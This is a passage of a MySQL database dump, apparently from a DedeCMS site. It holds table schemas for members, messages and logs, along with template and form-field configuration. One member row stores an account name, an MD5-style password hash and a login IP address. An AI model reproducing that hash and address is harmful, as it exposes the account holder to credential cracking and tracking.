INSERT INTO `dede_freelist` VALUES (1,'测试内容','{listdir}/index_{listid}_{page}.html','{cmspath}/freelist/','index.html',1,'{style}/list_free.htm',1289712633,100,0,'{dede:list  pagesize=\"30\" col=\"1\" titlelen=\"60\" orderby=\"pubdate\" orderway=\"desc\"  typeid=\"1\"  channel=\"1\" }<li>[field:imglink/] [field:textlink/] <span class=info><small>日期：</small>[field:pubdate function=\"getdatemk(@me)\"/] <small>点击：</small>[field:click/] <small>好评：</small>[field:scores/] </span>	\n<p class=intro>[field:description/]...</p></li>{/dede:list}','阿三大厦大大','阿三大厦大厦大撒'),(10,'Google SiteMap 生成器','{listdir}googlemap_{page}.xml','{cmspath}','index.html',1,'{style}/googlemap.htm',1226884666,100,0,'{dede:list  pagesize=\"500\" col=\"1\" titlelen=\"60\" orderby=\"pubdate\" orderway=\"desc\" 	\n channel=\"1\"  keyword=\"\" }<url>	\n   <loc>[field:arcurl function=\"Gmapurl(@me)\"/]</loc> 	\n   <title>[field:title function=\"HtmlReplace(@me)\"/]</title>	\n   <news:news>	\n  <news:keywords>[field:keywords/]</news:keywords>	\n <news:publication_date>[field:senddate function=\"strftime(\"%Y-%m-%d\",@me)\"/]</news:publication_date>	\n </news:news>	\n</url>{/dede:list}','','');
/*!40000 ALTER TABLE `dede_freelist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_homepageset`
--

DROP TABLE IF EXISTS `dede_homepageset`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_homepageset` (
  `templet` char(50) NOT NULL DEFAULT '',
  `position` char(30) NOT NULL DEFAULT '',
  `showmod` tinyint(2) NOT NULL DEFAULT '1'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_homepageset`
--

LOCK TABLES `dede_homepageset` WRITE;
/*!40000 ALTER TABLE `dede_homepageset` DISABLE KEYS */;
INSERT INTO `dede_homepageset` VALUES ('hqxx/index.htm','../index.html',1);
/*!40000 ALTER TABLE `dede_homepageset` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_keywords`
--

DROP TABLE IF EXISTS `dede_keywords`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_keywords` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` char(16) NOT NULL DEFAULT '',
  `rank` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `sta` smallint(6) NOT NULL DEFAULT '1',
  `rpurl` char(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `keyword` (`keyword`,`rank`,`sta`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_keywords`
--

LOCK TABLES `dede_keywords` WRITE;
/*!40000 ALTER TABLE `dede_keywords` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_keywords` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_log`
--

DROP TABLE IF EXISTS `dede_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_log` (
  `lid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `adminid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `filename` char(60) NOT NULL DEFAULT '',
  `method` char(10) NOT NULL DEFAULT '',
  `query` char(200) NOT NULL DEFAULT '',
  `cip` char(15) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_log`
--

LOCK TABLES `dede_log` WRITE;
/*!40000 ALTER TABLE `dede_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member`
--

DROP TABLE IF EXISTS `dede_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member` (
  `mid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mtype` varchar(20) NOT NULL DEFAULT '个人',
  `userid` char(20) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `uname` char(36) NOT NULL DEFAULT '',
  `sex` enum('男','女','保密') NOT NULL DEFAULT '保密',
  `rank` smallint(5) unsigned NOT NULL DEFAULT '0',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `exptime` smallint(6) NOT NULL DEFAULT '0',
  `money` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `email` char(50) NOT NULL DEFAULT '',
  `scores` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `matt` smallint(5) unsigned NOT NULL DEFAULT '0',
  `spacesta` smallint(6) NOT NULL DEFAULT '0',
  `face` char(50) NOT NULL DEFAULT '',
  `safequestion` smallint(5) unsigned NOT NULL DEFAULT '0',
  `safeanswer` char(30) NOT NULL DEFAULT '',
  `jointime` int(10) unsigned NOT NULL DEFAULT '0',
  `joinip` char(16) NOT NULL DEFAULT '',
  `logintime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginip` char(16) NOT NULL DEFAULT '',
  `checkmail` smallint(6) NOT NULL DEFAULT '-1',
  PRIMARY KEY (`mid`),
  KEY `userid` (`userid`,`sex`),
  KEY `logintime` (`logintime`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member`
--

LOCK TABLES `dede_member` WRITE;
/*!40000 ALTER TABLE `dede_member` DISABLE KEYS */;
INSERT INTO `dede_member` VALUES (1,'个人','hqxuexiao','40cc3fe5f8008db984a2f1fc839953e0','hqxuexiao','男',100,0,0,0,'',10000,10,0,'',0,'',1550728393,'',1571306979,'39.149.1.41',-1);
/*!40000 ALTER TABLE `dede_member` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_company`
--

DROP TABLE IF EXISTS `dede_member_company`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_company` (
  `mid` mediumint(8) NOT NULL AUTO_INCREMENT,
  `company` varchar(36) NOT NULL DEFAULT '',
  `product` varchar(50) NOT NULL DEFAULT '',
  `place` smallint(5) unsigned NOT NULL DEFAULT '0',
  `vocation` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cosize` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tel` varchar(30) NOT NULL DEFAULT '',
  `fax` varchar(30) NOT NULL DEFAULT '',
  `linkman` varchar(20) NOT NULL DEFAULT '',
  `address` varchar(50) NOT NULL DEFAULT '',
  `mobile` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `url` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `introduce` text,
  `comface` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_company`
--

LOCK TABLES `dede_member_company` WRITE;
/*!40000 ALTER TABLE `dede_member_company` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_company` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_feed`
--

DROP TABLE IF EXISTS `dede_member_feed`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_feed` (
  `fid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `userid` char(20) NOT NULL DEFAULT '',
  `uname` char(36) NOT NULL DEFAULT '',
  `type` char(20) CHARACTER SET gb2312 NOT NULL DEFAULT '0',
  `aid` mediumint(8) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `title` char(253) NOT NULL,
  `note` char(200) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL,
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_feed`
--

LOCK TABLES `dede_member_feed` WRITE;
/*!40000 ALTER TABLE `dede_member_feed` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_feed` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_flink`
--

DROP TABLE IF EXISTS `dede_member_flink`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_flink` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` varchar(30) NOT NULL DEFAULT '',
  `url` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_flink`
--

LOCK TABLES `dede_member_flink` WRITE;
/*!40000 ALTER TABLE `dede_member_flink` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_flink` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_friends`
--

DROP TABLE IF EXISTS `dede_member_friends`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_friends` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `fid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `floginid` char(20) NOT NULL DEFAULT '',
  `funame` char(36) NOT NULL DEFAULT '',
  `mid` mediumint(8) NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `ftype` tinyint(4) NOT NULL DEFAULT '0',
  `groupid` int(8) NOT NULL DEFAULT '1',
  `description` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `fid` (`fid`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_friends`
--

LOCK TABLES `dede_member_friends` WRITE;
/*!40000 ALTER TABLE `dede_member_friends` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_friends` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_group`
--

DROP TABLE IF EXISTS `dede_member_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_group` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `groupname` varchar(50) NOT NULL,
  `mid` int(8) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_group`
--

LOCK TABLES `dede_member_group` WRITE;
/*!40000 ALTER TABLE `dede_member_group` DISABLE KEYS */;
INSERT INTO `dede_member_group` VALUES (1,'朋友',0);
/*!40000 ALTER TABLE `dede_member_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_guestbook`
--

DROP TABLE IF EXISTS `dede_member_guestbook`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_guestbook` (
  `aid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `gid` varchar(20) NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `uname` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `qq` varchar(50) NOT NULL DEFAULT '',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`aid`),
  KEY `mid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_guestbook`
--

LOCK TABLES `dede_member_guestbook` WRITE;
/*!40000 ALTER TABLE `dede_member_guestbook` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_guestbook` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_model`
--

DROP TABLE IF EXISTS `dede_member_model`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_model` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `table` varchar(30) NOT NULL,
  `description` varchar(50) NOT NULL,
  `state` int(2) NOT NULL DEFAULT '0',
  `issystem` int(2) NOT NULL DEFAULT '0',
  `info` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_model`
--

LOCK TABLES `dede_member_model` WRITE;
/*!40000 ALTER TABLE `dede_member_model` DISABLE KEYS */;
INSERT INTO `dede_member_model` VALUES (1,'个人','dede_member_person','个人会员模型',1,1,'	\n<field:onlynet itemname=\"联系方式限制\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"1\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:onlynet>	\n	\n<field:sex itemname=\"性别\" autofield=\"1\" type=\"radio\" isnull=\"true\" default=\"男,女,保密\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:sex>	\n	\n<field:uname itemname=\"昵称/公司名称\" autofield=\"1\" type=\"textchar\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:uname>	\n	\n<field:qq itemname=\"QQ\" autofield=\"1\" type=\"textchar\" isnull=\"true\" default=\"\"  maxlength=\"12\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:qq>	\n	\n<field:msn itemname=\"MSN\" autofield=\"1\" type=\"textchar\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:msn>	\n	\n<field:tel itemname=\"电话号码\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"15\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:tel>	\n	\n<field:mobile itemname=\"手机\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"15\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:mobile>	\n	\n<field:place itemname=\"目前所在地\" autofield=\"1\" type=\"int\" default=\"0\"  maxlength=\"5\" issearch=\"0\" isshow=\"0\" state=\"1\">	\n</field:place>	\n	\n	\n<field:oldplace itemname=\"家乡所在地\" autofield=\"1\" type=\"int\" default=\"0\"  maxlength=\"5\" issearch=\"0\" isshow=\"0\" state=\"1\">	\n</field:oldplace>	\n	\n	\n<field:birthday itemname=\"生日\" autofield=\"1\" type=\"datetime\" isnull=\"true\" default=\"\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:birthday>	\n	\n<field:star itemname=\"星座\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"1\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:star>	\n	\n<field:income itemname=\"收入\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:income>	\n	\n<field:education itemname=\"学历\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:education>	\n	\n<field:height itemname=\"身高\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"160\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:height>	\n	\n<field:bodytype itemname=\"体重\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:bodytype>	\n	\n<field:blood itemname=\"血型\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:blood>	\n	\n<field:vocation itemname=\"职业\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:vocation>	\n	\n<field:smoke itemname=\"吸烟\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:smoke>	\n	\n<field:marital itemname=\"婚姻状况\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:marital>	\n	\n<field:house itemname=\"住房\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:house>	\n	\n<field:drink itemname=\"饮酒\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:drink>	\n	\n<field:datingtype itemname=\"交友\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:datingtype>	\n	\n<field:language itemname=\"语言\" autofield=\"1\" type=\"checkbox\" isnull=\"true\" default=\"普通话,上海话,广东话,英语,日语,韩语,法语,意大利语,德语,西班牙语,俄语,阿拉伯语\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:language>	\n	\n	\n<field:nature itemname=\"性格\" autofield=\"1\" type=\"checkbox\" isnull=\"true\" default=\"性格外向,性格内向,活泼开朗,豪放不羁,患得患失,冲动,幽默,稳重,轻浮,沉默寡言,多愁善感,时喜时悲,附庸风雅,能说会道,坚强,脆弱,幼稚,成熟,快言快语,损人利己,狡猾善变,交际广泛,优柔寡断,自私,真诚,独立,依赖,难以琢磨,悲观消极,郁郁寡欢,胆小怕事,乐观向上,任性,自负,自卑,拜金,温柔体贴,小心翼翼,暴力倾向,逆来顺受,不拘小节,暴躁,倔强,豪爽,害羞,婆婆妈妈,敢做敢当,助人为乐,耿直,虚伪,孤僻,老实,守旧,敏感,迟钝,婆婆妈妈,武断,果断,刻薄\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:nature>	\n	\n<field:lovemsg itemname=\"人生格言\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"100\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:lovemsg>	\n	\n<field:address itemname=\"家庭住址\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:address>	\n	\n<field:uptime itemname=\"更新时间\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"\"  maxlength=\"10\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:uptime>	\n'),(2,'企业','dede_member_company','公司企业会员模型',1,1,'	\n<field:company itemname=\"公司名称\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"36\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:company>	\n	\n<field:product itemname=\"公司产品\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:product>	\n	\n<field:place itemname=\"所在地址\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:place>	\n	\n<field:vocation itemname=\"所属行业\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:vocation>	\n	\n<field:cosize itemname=\"公司规模\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:cosize>	\n	\n<field:tel itemname=\"电话号码\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:tel>	\n	\n<field:fax itemname=\"传真\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:fax>	\n	\n<field:linkman itemname=\"联系人\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"20\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:linkman>	\n	\n<field:address itemname=\"详细地址\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:address>	\n	\n<field:mobile itemname=\"手机\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:mobile>	\n	\n<field:email itemname=\"邮箱\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:email>	\n	\n<field:url itemname=\"地址\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:url>	\n	\n<field:uptime itemname=\"更新时间\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"10\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:uptime>	\n	\n<field:checked itemname=\"是否审核\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"1\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:checked>	\n	\n<field:introduce itemname=\"公司简介\" autofield=\"1\" type=\"multitext\" isnull=\"true\" default=\"\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:introduce>	\n	\n<field:comface itemname=\"公司标志\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"255\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:comface>	\n');
/*!40000 ALTER TABLE `dede_member_model` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_msg`
--

DROP TABLE IF EXISTS `dede_member_msg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_msg` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userid` char(20) NOT NULL DEFAULT '',
  `ip` char(15) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`id`),
  KEY `id` (`ischeck`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_msg`
--

LOCK TABLES `dede_member_msg` WRITE;
/*!40000 ALTER TABLE `dede_member_msg` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_msg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_operation`
--

DROP TABLE IF EXISTS `dede_member_operation`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_operation` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `buyid` varchar(80) NOT NULL DEFAULT '',
  `pname` varchar(50) NOT NULL DEFAULT '',
  `product` varchar(10) NOT NULL DEFAULT '',
  `money` int(11) NOT NULL DEFAULT '0',
  `mtime` int(11) NOT NULL DEFAULT '0',
  `pid` int(11) NOT NULL DEFAULT '0',
  `mid` int(11) NOT NULL DEFAULT '0',
  `sta` int(11) NOT NULL DEFAULT '0',
  `oldinfo` varchar(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `buyid` (`buyid`),
  KEY `pid` (`pid`,`mid`,`sta`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_operation`
--

LOCK TABLES `dede_member_operation` WRITE;
/*!40000 ALTER TABLE `dede_member_operation` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_operation` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_person`
--

DROP TABLE IF EXISTS `dede_member_person`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_person` (
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `onlynet` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `sex` enum('男','女','保密') NOT NULL DEFAULT '男',
  `uname` char(30) NOT NULL DEFAULT '',
  `qq` char(12) NOT NULL DEFAULT '',
  `msn` char(50) NOT NULL DEFAULT '',
  `tel` varchar(15) NOT NULL DEFAULT '',
  `mobile` varchar(15) NOT NULL DEFAULT '',
  `place` smallint(5) unsigned NOT NULL DEFAULT '0',
  `oldplace` smallint(5) unsigned NOT NULL DEFAULT '0',
  `birthday` date NOT NULL DEFAULT '1980-01-01',
  `star` smallint(6) unsigned NOT NULL DEFAULT '1',
  `income` smallint(6) NOT NULL DEFAULT '0',
  `education` smallint(6) NOT NULL DEFAULT '0',
  `height` smallint(5) unsigned NOT NULL DEFAULT '160',
  `bodytype` smallint(6) NOT NULL DEFAULT '0',
  `blood` smallint(6) NOT NULL DEFAULT '0',
  `vocation` smallint(6) NOT NULL DEFAULT '0',
  `smoke` smallint(6) NOT NULL DEFAULT '0',
  `marital` smallint(6) NOT NULL DEFAULT '0',
  `house` smallint(6) NOT NULL DEFAULT '0',
  `drink` smallint(6) NOT NULL DEFAULT '0',
  `datingtype` smallint(6) NOT NULL DEFAULT '0',
  `language` set('普通话','上海话','广东话','英语','日语','韩语','法语','意大利语','德语','西班牙语','俄语','阿拉伯语') DEFAULT NULL,
  `nature` set('性格外向','性格内向','活泼开朗','豪放不羁','患得患失','冲动','幽默','稳重','轻浮','沉默寡言','多愁善感','时喜时悲','附庸风雅','能说会道','坚强','脆弱','幼稚','成熟','快言快语','损人利己','狡猾善变','交际广泛','优柔寡断','自私','真诚','独立','依赖','难以琢磨','悲观消极','郁郁寡欢','胆小怕事','乐观向上','任性','自负','自卑','拜金','温柔体贴','小心翼翼','暴力倾向','逆来顺受','不拘小节','暴躁','倔强','豪爽','害羞','婆婆妈妈','敢做敢当','助人为乐','耿直','虚伪','孤僻','老实','守旧','敏感','迟钝','婆婆妈妈','武断','果断','刻薄') DEFAULT NULL,
  `lovemsg` varchar(100) NOT NULL DEFAULT '',
  `address` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_person`
--

LOCK TABLES `dede_member_person` WRITE;
/*!40000 ALTER TABLE `dede_member_person` DISABLE KEYS */;
INSERT INTO `dede_member_person` VALUES (1,1,'男','hqxuexiao','','','','',0,0,'1980-01-01',1,0,0,160,0,0,0,0,0,0,0,0,'','','','',0);
/*!40000 ALTER TABLE `dede_member_person` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_pms`
--

DROP TABLE IF EXISTS `dede_member_pms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_member_pms` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `floginid` varchar(20) NOT NULL DEFAULT '',
  `fromid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `toid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tologinid` char(20) NOT NULL DEFAULT '',
  `folder` enum('inbox','outbox') DEFAULT 'inbox',
  `subject` varchar(60) NOT NULL DEFAULT '',
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  `writetime` int(10) unsigned NOT NULL DEFAULT '0',
  `hasview` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `isadmin` tinyint(1) NOT NULL DEFAULT '0',
  `message` text,
  PRIMARY KEY (`id`),
  KEY `sendtime` (`sendtime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_member_pms`
--

LOCK TABLES `dede_member_pms` WRITE;
/*!40000 ALTER TABLE `dede_member_pms` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_member_pms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_member_snsmsg`
--

